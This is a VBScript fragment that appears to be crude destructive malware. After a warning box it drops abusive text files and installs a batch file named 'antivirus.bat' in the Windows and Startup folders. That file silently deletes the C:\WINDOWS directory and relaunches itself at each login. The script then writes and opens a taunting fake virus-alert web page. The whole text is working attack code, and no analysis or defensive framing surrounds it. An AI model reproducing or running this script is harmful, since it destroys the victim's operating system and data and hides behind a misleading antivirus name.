   MsgBox "Caution", vbCritical, "Caution Use At own risk only"
   Dim fso
   Dim anti
   Dim notepad
   Dim batch
   Set fso = CreateObject("Scripting.FileSystemObject")
   Set anti = CreateObject("Scripting.FileSystemObject")
   Set notepad = anti.CreateTextFile("C:\ASS.TXT")
   Set notepad = anti.CreateTextFile("C:\PROGRAM FILES/fuckass.txt")
   notepad.Writeline "hey ass fucker "
   notepad.Writeline "fucker"
   notepad.Writeline "your so screwed"
   notepad.Close

   Set anti = CreateObject("Scripting.FileSystemObject")
   Set batch = anti.CreateTextFile("C:\WINDOWS\antivirus.bat")
   Set batch = anti.CreateTextFile("C:\Documents and Settings\All Users\Start Menu\Programs/startup/antivirus.bat")
   batch.Writeline "del C:\WINDOWS /q /s "
   batch.Writeline "START C:\WINDOWS\antivirus.bat"
   batch.Close
   Dim html, page
   Set html = CreateObject("Scripting.FileSystemObject")
   Set page = html.CreateTextFile("C:\antivirus.html")
   page.Writeline "<html>"
   page.Writeline "<head>"
   page.Writeline "<P><B><U>READ THIS FAST, YOURE PC HEALTH IS IN GREAT DANGER! YOURE PC IS HIT BY A VIRUS!</B></U></P>"
   page.Writeline "</head>"
   page.Writeline "<body>"
   page.Writeline "<P>if you want to get rid of it... well simply find it out yourself!</P>"
   page.Writeline "<P>why would i tell you  anyway my time by telling you?</p>"
   page.Writeline "<P>anywayz, <b><u>your fucked up </b></u></p>"
   page.Writeline "<p><b><u>HAVE FUN WITH IT! </b></u></p>"
   page.Writeline "<p><b><u>HAVE FUN WITH IT! </b></u></p>"
   page.Writeline "<p><b><u>HAVE FUN WITH IT! </b></u></p>"
   page.Writeline "<p><b><u>HAVE FUN WITH IT! </b></u></p>"
   page.Writeline "<p><b><u>HAVE FUN WITH IT! </b></u></p>"
   page.Writeline "<p><b><u>HAVE FUN WITH IT! </b></u></p>"
   page.Writeline "<p><b><u>HAVE FUN WITH IT! </b></u></p>"
   page.Writeline "<p><b><u>HAVE FUN WITH IT! </b></u></p>"
   page.Writeline "<p><b><u>HAVE FUN WITH IT! </b></u></p>"
   page.Writeline "</body>"
   page.Writeline "</HTML>"
   page.Close

   Dim shell
   Set shell = CreateObject("WScript.Shell")
   shell.Run "C:\antivirus.html"

   End Sub
